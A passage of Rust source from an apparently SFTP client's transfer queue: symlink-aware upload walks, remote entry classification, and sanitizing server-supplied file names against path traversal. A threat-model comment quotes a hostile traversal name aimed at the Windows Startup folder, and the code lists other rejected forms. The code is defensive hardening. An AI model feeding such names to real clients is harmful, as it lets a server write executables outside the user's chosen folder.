pub fn sftp_close_edit(
    app: AppHandle,
    session_id: String,
    remote: String,
) -> CmdResult<serde_json::Value> {
    let key = format!("{session_id}:{remote}");
    app.state::<EditRegistry>().stop(&key);
    Ok(serde_json::json!({ "ok": true }))
}

/// Close the SFTP subsystem for a session (also stops edit watches).
#[tauri::command]
pub fn sftp_close(app: AppHandle, session_id: String) -> CmdResult<serde_json::Value> {
    app.state::<EditRegistry>()
        .stop_all_for_session(&session_id);
    app.state::<KeepaliveRegistry>().stop(&session_id);
    app.state::<SftpRegistry>().remove(&session_id);
    Ok(serde_json::json!({ "ok": true }))
}

// ─── transfer queue ────────────────────────────────────────────────────────

use crate::sftp::queue::{
    self as tfq, clear_finished as q_clear, emit_queue, enqueue as q_enqueue, retry_job as q_retry,
    JobKind, QueuedItem, ResumeMode,
};

/// Resolve the resume mode for a queue-add call: explicit argument wins,
/// otherwise the stored default (`setting.sftpResumeDefault`, itself
/// defaulting to "ask" - the UI layer resolves Ask before enqueue).
fn resolve_resume_mode(app: &AppHandle, resume: Option<&str>) -> ResumeMode {
    let raw = match resume.map(|s| s.trim()).filter(|s| !s.is_empty()) {
        Some(s) => s.to_string(),
        None => app
            .state::<AppState>()
            .db
            .get_config("setting.sftpResumeDefault")
            .ok()
            .flatten()
            .unwrap_or_else(|| "ask".to_string()),
    };
    ResumeMode::from_str_loose(&raw)
}

/// Resolve the resume mode for one queued item: the item's own `resume` field
/// wins, otherwise the batch-wide value. The renderer's conflict dialog decides
/// per file, so a batch may mix actions.
fn item_resume(item: &serde_json::Value, batch: ResumeMode) -> ResumeMode {
    match item.get("resume").and_then(|v| v.as_str()) {
        Some(s) if !s.trim().is_empty() => ResumeMode::from_str_loose(s),
        _ => batch,
    }
}

/// Expand one picked local path into upload jobs - a file becomes one, a
/// folder is walked - and say what was left out, and why: the item's
/// warnings. A pick of which nothing at all can be uploaded (a link to a
/// folder, a special file, a link to a protected file) is an error, as for a
/// download; the protected files a folder upload skips are warnings (both
/// used to be only logged, the pick reported as queued with nothing added).
///
/// Symlink-aware and cycle-breaking: the walk only ever enters REAL folders.
/// A link to a folder (or a Windows junction) is never followed - following
/// one can loop (`ln -s .. up`) - and a link to a FILE is uploaded by
/// following it exactly one level (File::open resolves it; no recursion, no
/// cycle) once its target passed the read rules.
///
/// Cheap per file: the pick itself passed the full read rules (the caller),
/// every folder below it is a real folder - so its resolved path is its
/// parent's plus its name - and is checked once, and a file is judged by its
/// folder's resolved path plus its own name, without touching the disk. Only
/// a linked file is resolved, because it is followed.
fn expand_upload(
    local: &std::path::Path,
    remote: &str,
    ctx: &ItemCtx,
    sensitive: &SensitiveLocations,
) -> Result<(Vec<QueuedItem>, Notes), String> {
    let mut walk = UploadWalk {
        ctx,
        sensitive,
        jobs: Vec::new(),
        notes: Notes::default(),
    };
    walk.pick(local, remote)?;
    Ok((walk.jobs, walk.notes))
}

/// One upload pick being expanded (see [`expand_upload`]).
struct UploadWalk<'a> {
    ctx: &'a ItemCtx,
    sensitive: &'a SensitiveLocations,
    jobs: Vec<QueuedItem>,
    notes: Notes,
}

impl UploadWalk<'_> {
    /// The picked path itself; `Err` when nothing of it can be uploaded.
    fn pick(&mut self, local: &std::path::Path, remote: &str) -> Result<(), String> {
        // symlink_metadata (lstat): classifies the pick itself, never follows.
        match std::fs::symlink_metadata(local) {
            Ok(md) if md.is_symlink() => self.follow_link(local, remote),
            Ok(md) if md.is_dir() => {
                self.folder(local, remote);
                Ok(())
            }
            // The caller checked the pick with the full read rules.
            Ok(md) if md.is_file() => {
                self.jobs.push(self.ctx.upload(local, remote, md.len()));
                Ok(())
            }
            Ok(_) => Err("it is not a regular file or folder".to_string()),
            Err(e) => Err(format!("it could not be read ({e})")),
        }
    }

    /// Walk the real folder `root`. Iterative on purpose: an explicit stack
    /// has no recursion depth to overflow.
    fn folder(&mut self, root: &std::path::Path, remote: &str) {
        let resolved = canonical(root).unwrap_or_else(|_| root.to_path_buf());
        let mut stack = vec![(root.to_path_buf(), resolved, remote.to_string())];
        while let Some((dir, dir_resolved, dir_remote)) = stack.pop() {
            if let Some(why) = self.sensitive.folder_read_refusal(&dir, &dir_resolved) {
                self.notes.push(format!(
                    "skipped {} and everything in it: {why}",
                    dir.display()
                ));
                continue;
            }
            let entries = match std::fs::read_dir(&dir) {
                Ok(entries) => entries,
                Err(e) => {
                    self.skip(&dir, &format!("it could not be read ({e})"));
                    continue;
                }
            };
            for entry in entries {
                let entry = match entry {
                    Ok(entry) => entry,
                    Err(e) => {
                        self.skip(&dir, &format!("an entry in it could not be read ({e})"));
                        continue;
                    }
                };
                let (path, name) = (entry.path(), entry.file_name());
                let child_remote = join_remote(&dir_remote, &name.to_string_lossy());
                // DirEntry::file_type does not follow a link.
                match entry.file_type() {
                    Ok(kind) if kind.is_symlink() => {
                        if let Err(why) = self.follow_link(&path, &child_remote) {
                            self.skip(&path, &why);
                        }
                    }
                    Ok(kind) if kind.is_dir() => {
                        stack.push((path, dir_resolved.join(&name), child_remote));
                    }
                    Ok(kind) if kind.is_file() => {
                        self.file(&entry, &dir_resolved.join(&name), &child_remote);
                    }
                    Ok(_) => self.skip(&path, "it is not a regular file or folder"),
                    Err(e) => self.skip(&path, &format!("it could not be read ({e})")),
                }
            }
        }
    }

    /// A regular file met by the walk; `resolved` is its folder's resolved
    /// path plus its name.
    fn file(&mut self, entry: &std::fs::DirEntry, resolved: &std::path::Path, remote: &str) {
        let path = entry.path();
        if let Some(why) = self
            .sensitive
            .path_refusal(&path, resolved, LocalAccess::Read)
        {
            self.skip(&path, why);
            return;
        }
        match entry.metadata() {
            Ok(md) => self.jobs.push(self.ctx.upload(&path, remote, md.len())),
            Err(e) => self.skip(&path, &format!("it could not be read ({e})")),
        }
    }

    /// A link - the pick, or met by the walk: followed one level to a file
    /// whose target may be read. `Err` says why it is not uploaded.
    fn follow_link(&mut self, path: &std::path::Path, remote: &str) -> Result<(), String> {
        match std::fs::metadata(path) {
            Ok(target) if target.is_file() => match protected_upload_source(path, self.sensitive) {
                Some(why) => Err(format!(
                    "it links to a file that cannot be uploaded ({why})"
                )),
                None => {
                    self.jobs.push(self.ctx.upload(path, remote, target.len()));
                    Ok(())
                }
            },
            Ok(target) if target.is_dir() => Err(
                "it is a link to a folder (a symbolic link or junction), and links to folders \
                 are not followed - pick the folder it points to instead"
                    .to_string(),
            ),
            Ok(_) => Err("it links to something that is not a regular file".to_string()),
            Err(e) => Err(format!("it is a link whose target cannot be read ({e})")),
        }
    }

    fn skip(&mut self, path: &std::path::Path, why: &str) {
        log::warn!("[sshspan-sftp] upload: skipping {}: {why}", path.display());
        self.notes
            .push(format!("skipped {}: {why}", path.display()));
    }
}

/// Length in UTF-16 code units (the Windows file-name limit's unit). Chars
/// outside the BMP count as two, matching Win32 behavior.
fn sanitized_len_utf16(s: &str) -> usize {
    s.chars().map(|c| c.len_utf16()).sum()
}

/// Sanitize a single remote-supplied file name for use as a local file name
/// on the destination filesystem. Returns `None` for names that must be
/// skipped entirely (they signal a hostile or broken server, not a file we
/// can safely materialize).
///
/// Threat model: a malicious/compromised SFTP server controls ReadDir entry
/// names verbatim. A name containing separators, `..` segments, drive
/// letters, or Windows device names must never reach `Path::join`, or the
/// queued download would write outside the user-chosen destination
/// (e.g. `../../Windows/Start Menu/Programs/Startup/x.exe`).
///
/// Policy (input → action):
/// - `/`, `\` anywhere → reject: the name is a path, not a file name, and
///   flattening it would silently materialize a file the user can't match
///   back to what the server listed.
/// - Any `..` path segment (`..`, `a/../b`, `a/..`), or leading `..`-free
///   but dot-only names like `....` (Windows strips trailing dots, so
///   `....` would land as `..`) → reject.
/// - Drive-letter prefixes (`C:`, `C:\evil`, `c:relative`) → reject: on
///   Windows `join` with such a name discards the base directory entirely.
/// - Absolute-path prefixes (`/etc`, `\\server\share`) → reject.
/// - A NUL byte → reject: C APIs see a shorter name than the server listed.
/// - Windows reserved device names - CON, PRN, AUX, NUL, CONIN$, CONOUT$,
///   COM0-9, LPT0-9 and COM/LPT with a superscript ¹ ² ³ - case-insensitive,
///   with or without extension (`CON.exe`, `NUL.txt`) → reject: creating
///   them redirects to a device or fails unpredictably.
/// - Empty / whitespace-only → reject.
/// - Windows-invalid characters `:*?"<>|` → sanitize to `_` (same mapping
///   as [`crate::sftp::sanitize_stage_base`], kept inline so the queue path
///   has no hidden coupling to the staging code).
/// - Trailing dots or spaces → strip (Windows would drop them anyway, but
///   the local name then differs from the remote one, so do it explicitly),
///   and any other trailing whitespace with them.
/// - Result empty after sanitization → reject.
///
/// Idempotent: a name it returns comes back unchanged from a second pass
/// (the plain-name check relies on that).
fn sanitize_remote_name(name: &str) -> Option<String> {
    let trimmed = name.trim();
    if trimmed.is_empty() {
        return None;
    }
    // Reject anything that carries path structure. `Path::is_absolute` alone
    // misses `C:relative` and `\\server`, so separators and drive letters are
    // checked explicitly.
    if trimmed.contains('/') || trimmed.contains('\\') || trimmed.contains('\0') {
        return None;
    }
    // Drive letter: exactly one ASCII alpha followed by ':', at the start.
    let bytes = trimmed.as_bytes();
    if bytes.len() >= 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic() {
        return None;
    }
    // Dot-only names (`..`, `....`): Windows strips trailing dots, so these
    // collapse to `.`/`..` on disk and become traversal components. Reject.
    // `a..b` is a legal (if odd) name and stays.
    if trimmed.chars().all(|c| c == '.') {
        return None;
    }
    // NTFS/ReFS component limit is 255 UTF-16 units; longer names cannot be
    // created locally, so the job would just fail at write time anyway.
    if sanitized_len_utf16(trimmed) > 255 {
        return None;
    }
    let mut sanitized: String = trimmed
        .chars()
        .map(|c| match c {
            ':' | '*' | '?' | '"' | '<' | '>' | '|' => '_',
            // Control characters are invalid in Windows file names.
            c if (c as u32) < 0x20 => '_',
            _ => c,
        })
        .collect();
    // Trailing dots/spaces are stripped by Win32; strip here so the queue's
    // path and the file on disk agree. Any other trailing whitespace goes
    // too, as `trim` above would take it on a second pass: the sanitizer is
    // idempotent (its output passes the plain-name check of
    // `derived_local_refusal`), where `notes\u{3000}.` used to become
    // `notes\u{3000}` - and then be refused as not a plain name.
    while sanitized
        .chars()
        .next_back()
        .is_some_and(|c| c == '.' || c.is_whitespace())
    {
        sanitized.pop();
    }
    if sanitized.is_empty() || sanitized.chars().all(|c| c == '.') {
        return None;
    }
    // Windows reserved device names, with or without an extension: `CON`,
    // `con.txt`, `NUL.tar.gz`, `CONIN$`, `COM¹.log`.
    let stem = sanitized.split('.').next().unwrap_or("").to_uppercase();
    if is_reserved_device_name(&stem) {
        return None;
    }
    Some(sanitized)
}

/// Whether `stem` (upper case) is a Windows device name: CON, PRN, AUX, NUL,
/// CONIN$, CONOUT$, and COM or LPT followed by one digit 0-9 or a superscript
/// ¹ ² ³ (all reserved by Win32 path handling).
fn is_reserved_device_name(stem: &str) -> bool {
    if matches!(stem, "CON" | "PRN" | "AUX" | "NUL" | "CONIN$" | "CONOUT$") {
        return true;
    }
    let Some(rest) = stem
        .strip_prefix("COM")
        .or_else(|| stem.strip_prefix("LPT"))
    else {
        return false;
    };
    let mut chars = rest.chars();
    matches!(
        (chars.next(), chars.next()),
        (Some('0'..='9' | '\u{b9}' | '\u{b2}' | '\u{b3}'), None)
    )
}

/// Join a sanitized remote name under `dir` and verify the result stays under
/// the canonical destination `root`. Returns `None` (caller skips the entry)
/// when the join would escape - the belt-and-braces check behind
/// [`sanitize_remote_name`], so even a missed sanitization case cannot queue
/// an out-of-root write.
fn safe_join_under(root: &std::path::Path, dir: &std::path::Path, name: &str) -> Option<PathBuf> {
    let name = sanitize_remote_name(name)?;
    let joined = dir.join(&name);
    // Structural check: every component the join added must be normal. A
    // `..` segment, drive-letter prefix, or root prefix inserted by a future
    // sanitizer regression shows up here as a non-normal component.
    let mut components = joined.components();
    for expected in dir.components() {
        match components.next() {
            Some(actual) if actual == expected => {}
            _ => return None,
        }
    }
    if !components.all(|c| matches!(c, std::path::Component::Normal(_))) {
        return None;
    }
    // Containment: the result must stay under the canonical destination root
    // (`dir` itself is root or a canonicalized descendant of it).
    if !joined.starts_with(root) {
        return None;
    }
    Some(joined)
}

// ─── recursive remote walks ────────────────────────────────────────────────

/// What a recursive walk needs to know about a directory entry.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum EntryKind {
    File,
    Dir,
    /// A symbolic link. Walks never follow one: it can point at an ancestor
    /// (an endless loop), outside the tree, or at nothing.
    Symlink,
    /// A FIFO, socket or device. Reading one can block forever, so
    /// downloads leave it alone.
    Other,
    /// The server did not say what this is and asking could not settle it
    /// (see [`classify_untyped`]). Never guessed: walks leave it alone and
    /// say so.
    Unknown,
}

/// One entry of a remote directory listing, reduced to what the walks need.
#[derive(Debug, Clone, PartialEq)]
struct ListedEntry {
    name: String,
    kind: EntryKind,
    size: u64,
    mtime: Option<u32>,
    /// For an [`EntryKind::Unknown`] entry: what failed when its type was
    /// asked for (shown in the walk's notes).
    why: Option<String>,
}

/// Classify an entry from the attributes its directory listing carried.
/// `None` means the listing did not say, so the caller has to ask. SFTP's
/// READDIR reports `lstat`-derived attributes (see [`SftpEntry`]), so a
/// symlink is a symlink here - no per-entry stat needed, and a dangling one
/// cannot fail the walk the way the old STAT-based classification did.
fn classify_attrs(md: &russh_sftp::protocol::FileAttributes) -> Option<EntryKind> {
    use russh_sftp::protocol::FileType;
    let mode = md.permissions?;
    // 0o170000 is S_IFMT, the file-type bits. Permission bits WITHOUT any
    // type bits (a bare 0o644) say nothing about what the entry is: it used
    // to be taken for a file, which gave folders a file's mode in a
    // recursive chmod and made a link look like something to change.
    if mode & 0o170000 == 0 {
        return None;
    }
    Some(match md.file_type() {
        FileType::Dir => EntryKind::Dir,
        FileType::Symlink => EntryKind::Symlink,
        FileType::File => EntryKind::File,
        FileType::Other => EntryKind::Other,
    })
}

/// List one remote directory for a walk, classified from the listing itself.
/// Only an entry whose listing carried no file type costs extra round trips
/// (see [`classify_untyped`]); one whose type cannot be settled that way
/// (its LSTAT fails, say) is `Unknown` - left alone by every walk - and
/// carries the reason.
async fn list_remote_dir(
    sftp: &russh_sftp::client::SftpSession,
    dir: &str,
) -> Result<Vec<ListedEntry>, String> {
    let entries = sftp.read_dir(dir).await.map_err(sftp_error_detail)?;
    let mut out = Vec::new();
    // The folder's own REALPATH, asked for once for all its entries.
    let mut parent = RealFolder::default();
    for entry in entries {
        let name = entry.file_name();
        if name == "." || name == ".." {
            continue;
        }
        let md = entry.metadata();
        let (kind, why) = match classify_attrs(&md) {
            Some(kind) => (kind, None),
            None => {
                let path = join_remote(dir, &name);
                let untyped = classify_untyped_in(sftp, &path, &mut parent).await;
                (untyped.kind, untyped.why)
            }
        };
        out.push(ListedEntry {
            name,
            kind,
            size: md.size.unwrap_or(0),
            mtime: md.mtime,
            why,
        });
    }
    Ok(out)
}

/// What [`classify_untyped`] found out about an entry.
struct Untyped {
    kind: EntryKind,
    /// For `Unknown`: what failed.
    why: Option<String>,
    /// READLINK said "not a link", or it resolves to itself: whatever it is,
    /// it is not a symbolic link.
    not_a_link: bool,
}

/// The kind of an entry whose listing carried no file type: LSTAT first; if
/// the server leaves the type out there as well, READLINK (walks never follow
/// a link) and opening it as a folder (a folder or a file). Opening FOLLOWS a
/// link, and READLINK does not always settle it - OpenSSH answers a non-link
/// with BAD_MESSAGE, but other servers answer "failure" or "unsupported" for
/// a link as well (one that said "failure" had a link walked as a folder:
/// downloaded, chmod'ed and deleted through). So an entry counts as a folder
/// only when it also resolves to itself (see [`resolves_to_itself`]), and as
/// a file only when READLINK said "not a link" or it resolves to itself; one
/// that resolves elsewhere is a link. Whatever cannot be settled - LSTAT
/// refused or the entry gone, REALPATH failing, the folder probe refused -
/// is `Unknown`: left alone, never guessed, and returned with what failed.
async fn classify_untyped(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
) -> (EntryKind, Option<String>) {
    let untyped = classify_untyped_in(sftp, path, &mut RealFolder::default()).await;
    (untyped.kind, untyped.why)
}

/// [`classify_untyped`], with what it found out; the REALPATH of the folder
/// `path` is in is kept in `parent` for the next entry of that folder.
async fn classify_untyped_in(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    parent: &mut RealFolder,
) -> Untyped {
    let settled = |kind, not_a_link| Untyped {
        kind,
        why: None,
        not_a_link,
    };
    let unknown = |why, not_a_link| Untyped {
        kind: EntryKind::Unknown,
        why: Some(why),
        not_a_link,
    };
    match sftp.symlink_metadata(path).await {
        Ok(lstat) => {
            if let Some(kind) = classify_attrs(&lstat) {
                return settled(kind, kind != EntryKind::Symlink);
            }
        }
        Err(e) => return unknown(format!("LSTAT failed: {}", sftp_error_detail(e)), false),
    }
    let readlink_says_no = match sftp.read_link(path).await {
        Ok(_) => return settled(EntryKind::Symlink, false),
        Err(e) => readlink_says_not_a_link(&e),
    };
    if !readlink_says_no {
        match resolves_to_itself(sftp, path, parent).await {
            Ok(true) => {}
            Ok(false) => return settled(EntryKind::Symlink, false),
            Err(why) => return unknown(why, false),
        }
    }
    // Not a link, from here on.
    let outcome = sftp.read_dir(path).await.map(drop);
    let why = outcome.as_ref().err().map(|e| {
        format!(
            "opening it as a folder failed: {}",
            sftp_error_detail(e.clone())
        )
    });
    match folder_probe_kind(outcome) {
        // Checked above when READLINK did not settle it.
        EntryKind::Dir if readlink_says_no => match resolves_to_itself(sftp, path, parent).await {
            Ok(true) => settled(EntryKind::Dir, true),
            Ok(false) => settled(EntryKind::Symlink, false),
            Err(why) => unknown(why, true),
        },
        EntryKind::Unknown => Untyped {
            kind: EntryKind::Unknown,
            why,
            not_a_link: true,
        },
        kind => settled(kind, true),
    }
}

/// A folder and its REALPATH, kept for the next entry of the same folder.
#[derive(Default)]
struct RealFolder(Option<(String, String)>);

/// Whether `path` is the entry it names and not a link to something else:
/// REALPATH of `path` is REALPATH of its folder plus its name. (Opening a
/// link as a folder follows it, so that alone cannot tell.) This relies on
/// REALPATH resolving links, as OpenSSH's realpath(3) does; a server whose
/// REALPATH only tidies the text cannot be told apart this way. `Err` says
/// why it could not be checked. The folder's REALPATH is kept in `parent`:
/// one round trip per folder, not per entry.
async fn resolves_to_itself(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    parent: &mut RealFolder,
) -> Result<bool, String> {
    let trimmed = path.trim_end_matches('/');
    let (folder, name) = trimmed
        .rsplit_once('/')
        .filter(|(_, name)| !name.is_empty() && *name != "." && *name != "..")
        .ok_or_else(|| format!("{path} is not a name in a folder"))?;
    let folder = if folder.is_empty() { "/" } else { folder };
    let real = |p: &str| {
        let p = p.to_string();
        async move {
            sftp.canonicalize(p.clone())
                .await
                .map_err(|e| format!("REALPATH {p} failed: {}", sftp_error_detail(e)))
        }
    };
    let folder_real = match &parent.0 {
        Some((known, real)) if known == folder => real.clone(),
        _ => {
            let folder_real = real(folder).await?;
            parent.0 = Some((folder.to_string(), folder_real.clone()));
            folder_real
        }
    };
    let real_path = real(trimmed).await?;
    Ok(real_path == join_remote(&folder_real, name))
}

/// The attributes of `path` as LSTAT reports them - a file this app wrote and
/// is about to rename or continue - provided it is a REGULAR file. A symbolic
/// link is refused above all (STAT, which follows links, used to be asked: a
/// temp file swapped for a link was renamed over the user's file). On a
/// server that leaves the type bits out, READLINK, REALPATH and a folder
/// probe tell a link or a folder apart (see [`classify_untyped`]).
///
/// `written`: the bytes this app just wrote to it, if it did. A server that
/// answers the folder probe on a file with something other than "no such
/// file" / "failure" (permission denied, say) cannot tell a file from a
/// folder that way - every upload there failed. Such an entry is accepted
/// when it is known not to be a link and LSTAT reports exactly `written`
/// bytes: only a positive sign of a link or a folder refuses it.
pub(crate) async fn regular_file_attrs(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    written: Option<u64>,
) -> Result<russh_sftp::protocol::FileAttributes, String> {
    let md = sftp
        .symlink_metadata(path)
        .await
        .map_err(|e| format!("{path} could not be checked ({})", sftp_error_detail(e)))?;
    let untyped = match classify_attrs(&md) {
        Some(kind) => Untyped {
            kind,
            why: None,
            not_a_link: kind != EntryKind::Symlink,
        },
        None => classify_untyped_in(sftp, path, &mut RealFolder::default()).await,
    };
    match untyped.kind {
        EntryKind::File => Ok(md),
        EntryKind::Unknown if untyped.not_a_link && written.is_some() && md.size == written => {
            Ok(md)
        }
        EntryKind::Symlink => Err(format!(
            "{path} is not a regular file (it is a symbolic link)"
        )),
        EntryKind::Dir => Err(format!("{path} is not a regular file (it is a folder)")),
        EntryKind::Other => Err(format!("{path} is not a regular file")),
        EntryKind::Unknown => Err(format!(
            "{path} is not known to be a regular file (the server does not say)"
        )),
    }
}

/// What LSTAT says `path` is (`None` when nothing is there), with
/// [`classify_untyped`] for a server that leaves the type bits out.
pub(crate) async fn lstat_kind(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
) -> Option<EntryKind> {
    let md = sftp.symlink_metadata(path).await.ok()?;
    Some(match classify_attrs(&md) {
        Some(kind) => kind,
        None => classify_untyped(sftp, path).await.0,
    })
}

/// Whether a READLINK error means "this is not a link": OpenSSH's
/// sftp-server answers readlink(2)'s EINVAL with SSH_FX_BAD_MESSAGE (its
/// `errno_to_portable`). "Failure" and "no such file" used to count too, but
/// a server that answers every READLINK with "failure" says the same of a
/// link - those, like "unsupported", leave it to [`resolves_to_itself`].
fn readlink_says_not_a_link(e: &russh_sftp::client::error::Error) -> bool {
    sftp_status(e, &[russh_sftp::protocol::StatusCode::BadMessage])
}

/// Whether `path` opens as a folder (following a link, like STAT); see
/// [`folder_probe_kind`].
async fn probe_folder(sftp: &russh_sftp::client::SftpSession, path: &str) -> EntryKind {
    folder_probe_kind(sftp.read_dir(path).await.map(drop))
}

/// What opening an entry as a folder showed: `Dir`; `File` only when the
/// server answered that it is not a folder (OpenSSH's sftp-server maps
/// opendir(3)'s ENOTDIR to SSH_FX_NO_SUCH_FILE, other servers say
/// "failure"); anything else - refused, unsupported, a lost connection - is
/// `Unknown`, so a recursive change of that root is refused and such an
/// entry is left alone.
fn folder_probe_kind(outcome: Result<(), russh_sftp::client::error::Error>) -> EntryKind {
    use russh_sftp::protocol::StatusCode;
    match outcome {
        Ok(()) => EntryKind::Dir,
        Err(e) if sftp_status(&e, &[StatusCode::NoSuchFile, StatusCode::Failure]) => {
            EntryKind::File
        }
        Err(_) => EntryKind::Unknown,
    }
}

/// Whether an SFTP error is a status reply with one of `codes`.
fn sftp_status(
    e: &russh_sftp::client::error::Error,
    codes: &[russh_sftp::protocol::StatusCode],
) -> bool {
    matches!(e, russh_sftp::client::error::Error::Status(status) if codes.contains(&status.status_code))
}

/// `dir` + `/` + `name` as the server spells paths.
fn join_remote(dir: &str, name: &str) -> String {
    format!("{}/{}", dir.trim_end_matches('/'), name)
}

/// Human-readable notes about what a walk skipped or could not do. Capped so
/// a pathological tree (thousands of links, thousands of unreadable folders)
/// cannot turn the command's result into a megabyte of text; the number
/// hidden is kept.
#[derive(Debug, Default)]
struct Notes {
    items: Vec<String>,
    total: usize,
}

impl Notes {
    const KEEP: usize = 25;

    fn push(&mut self, note: impl Into<String>) {
        self.total += 1;
        if self.items.len() < Self::KEEP {
            self.items.push(note.into());
        }
    }

    fn extend(&mut self, other: Notes) {
        self.total += other.total.saturating_sub(other.items.len());
        for note in other.items {
            self.push(note);
        }
    }

    fn into_vec(self) -> Vec<String> {
        let hidden = self.total - self.items.len();
        let mut notes = self.items;
        if hidden > 0 {
            notes.push(format!("...and {hidden} more"));
        }
        notes
    }

    /// [`Self::into_vec`] without giving the notes up.
    fn to_vec(&self) -> Vec<String> {
        Notes {
            items: self.items.clone(),
            total: self.total,
        }
        .into_vec()
    }
}

/// Depth (directory levels below the folder the user picked) a recursive
/// download descends. Real trees are nowhere near it; a server that answers
/// every listing with yet another subdirectory is cut off here instead of
/// recursing until the path outgrows the server.
const DOWNLOAD_MAX_DEPTH: usize = 64;
/// Entries (files, folders and links - everything a listing returns) one
/// folder download may walk. Bounds the work, memory and queued rows a hostile
/// or runaway tree can cost; the cap is an error, not a silent truncation.
const DOWNLOAD_MAX_ENTRIES: usize = 10_000;

/// The result of walking a remote folder for download: nothing here has
/// touched the local filesystem yet, so a walk that fails or hits a cap leaves
/// nothing behind.
#[derive(Debug, Default)]
struct DownloadPlan {
    /// Local sub-directories to create (the picked folder itself first,
    /// parents before children).
    dirs: Vec<PlannedDir>,
    files: Vec<PlannedFile>,
    notes: Notes,
}

/// A local folder a download plan creates.
#[derive(Debug, Clone, PartialEq)]
struct PlannedDir {
    /// The server's path to the folder.
    remote: String,
    /// Sanitized components below the destination.
    rel: Vec<String>,
}

#[derive(Debug, Clone, PartialEq)]
struct PlannedFile {
    /// The server's path to the file.
    remote: String,
    /// Sanitized components below the destination, file name last.
    rel: Vec<String>,
    size: u64,
}

/// Walk `remote_root` through `list` and plan its download (A7-16 / A6-06).
/// `root_name` is the already-sanitized local name of the folder itself.
///
/// - Entries are classified from their listing attributes; symlinks are
///   skipped (reported, never followed or stat'd), so a dangling link no
///   longer aborts the whole folder and a link to a directory can neither be
///   copied twice nor loop.
/// - A folder BELOW the root that cannot be listed is a note, not a failure of
///   the batch. The picked root itself failing to list is an error: there is
///   nothing to download.
/// - Depth is capped at [`DOWNLOAD_MAX_DEPTH`] (deeper folders are skipped
///   with a note) and the entries walked at [`DOWNLOAD_MAX_ENTRIES`] (an
///   error: the user should download such a tree in parts).
/// - Names that cannot be used locally (`..`, separators, drive letters,
///   device names) are skipped, never flattened into a writable name.
async fn plan_download<L, LF>(
    remote_root: &str,
    root_name: &str,
    mut list: L,
) -> Result<DownloadPlan, String>
where
    L: FnMut(String) -> LF,
    LF: Future<Output = Result<Vec<ListedEntry>, String>>,
{
    let mut plan = DownloadPlan::default();
    plan.dirs.push(PlannedDir {
        remote: remote_root.to_string(),
        rel: vec![root_name.to_string()],
    });
    // Iterative on purpose: an explicit stack has no recursion depth to
    // overflow, whatever the server sends.
    let mut stack: Vec<(String, Vec<String>)> =
        vec![(remote_root.to_string(), vec![root_name.to_string()])];
    let mut seen = 0usize;
    while let Some((dir, rel)) = stack.pop() {
        let listing = match list(dir.clone()).await {
            Ok(listing) => listing,
            // The folder the user PICKED (the only entry whose `rel` is just
            // its own name): there is nothing to download and nothing to show
            // for it. As a note the caller would still create an empty local
            // folder and answer "ok, 0 added", so the item fails instead.
            Err(e) if rel.len() == 1 => return Err(format!("list {dir}: {e}")),
            Err(e) => {
                plan.notes
                    .push(format!("skipped {dir}: it could not be listed ({e})"));
                continue;
            }
        };
        for entry in listing {
            seen += 1;
            if seen > DOWNLOAD_MAX_ENTRIES {
                return Err(format!(
                    "{remote_root} holds more than {DOWNLOAD_MAX_ENTRIES} entries - \
                     download it in smaller parts (one sub-folder at a time)."
                ));
            }
            let remote = join_remote(&dir, &entry.name);
            match entry.kind {
                EntryKind::Symlink => {
                    plan.notes
                        .push(format!("skipped {remote}: symbolic links are not followed"));
                    continue;
                }
                EntryKind::Other => {
                    plan.notes
                        .push(format!("skipped {remote}: not a regular file or folder"));
                    continue;
                }
                EntryKind::Unknown => {
                    plan.notes
                        .push(unknown_kind_note(&remote, entry.why.as_deref()));
                    continue;
                }
                EntryKind::File | EntryKind::Dir => {}
            }
            let Some(safe) = sanitize_remote_name(&entry.name) else {
                plan.notes.push(format!(
                    "skipped {remote}: its name cannot be used as a local file name"
                ));
                continue;
            };
            let mut child_rel = rel.clone();
            child_rel.push(safe);
            if entry.kind == EntryKind::File {
                plan.files.push(PlannedFile {
                    remote,
                    rel: child_rel,
                    size: entry.size,
                });
            } else if child_rel.len() > DOWNLOAD_MAX_DEPTH + 1 {
                plan.notes.push(format!(
                    "skipped {remote}: nested deeper than {DOWNLOAD_MAX_DEPTH} levels"
                ));
            } else {
                plan.dirs.push(PlannedDir {
                    remote: remote.clone(),
                    rel: child_rel.clone(),
                });
                stack.push((remote, child_rel));
            }
        }
    }
    Ok(plan)
}

/// "skipped <remote>: ..." for an entry whose type could not be settled,
/// with the reason when there is one (a failed LSTAT used to be reported as
/// "the server does not say", hiding the cause).
fn unknown_kind_note(remote: &str, why: Option<&str>) -> String {
    match why {
        Some(why) => {
            format!("skipped {remote}: could not tell whether it is a file or a folder ({why})")
        }
        None => {
            format!("skipped {remote}: the server does not say whether it is a file or a folder")
        }
    }
}

/// Everything about one `sftp_queue_add` item that is not a path.
struct ItemCtx {
    session_id: String,
    server_name: String,
    resume: ResumeMode,
    preserve_ts: bool,
}

impl ItemCtx {
    /// The item's settings for `item` of `batch`.
    fn new(item: &serde_json::Value, batch: &BatchCtx<'_>) -> Self {
        Self {
            session_id: batch.session_id.to_string(),
            server_name: batch.server_name.to_string(),
            resume: item_resume(item, batch.resume),
            preserve_ts: batch.preserve_ts,
        }
    }

    fn job(&self, kind: JobKind, local: &std::path::Path, remote: &str, size: u64) -> QueuedItem {
        QueuedItem {
            kind,
            session_id: self.session_id.clone(),
            server_name: self.server_name.clone(),
            local_path: local.display().to_string(),
            remote_path: remote.to_string(),
            size,
            target: None,
            resume: Some(self.resume),
            // Honoured for downloads too: the queue stamps the remote mtime
            // onto the finished file (A7-36).
            preserve_ts: Some(self.preserve_ts),
        }
    }

    fn download(&self, remote: &str, local: PathBuf, size: u64) -> QueuedItem {
        self.job(JobKind::Download, &local, remote, size)
    }

    fn upload(&self, local: &std::path::Path, remote: &str, size: u64) -> QueuedItem {
        self.job(JobKind::Upload, local, remote, size)
    }
}

/// One expanded download item: the jobs to queue plus what was skipped.
#[derive(Default)]
struct ExpandedDownload {
    items: Vec<QueuedItem>,
    notes: Notes,
}

/// `root` + `rel`, each component re-checked by [`safe_join_under`] so a
/// regression in the sanitizer still cannot produce a path outside `root`.
fn join_local(root: &std::path::Path, rel: &[String]) -> Option<PathBuf> {
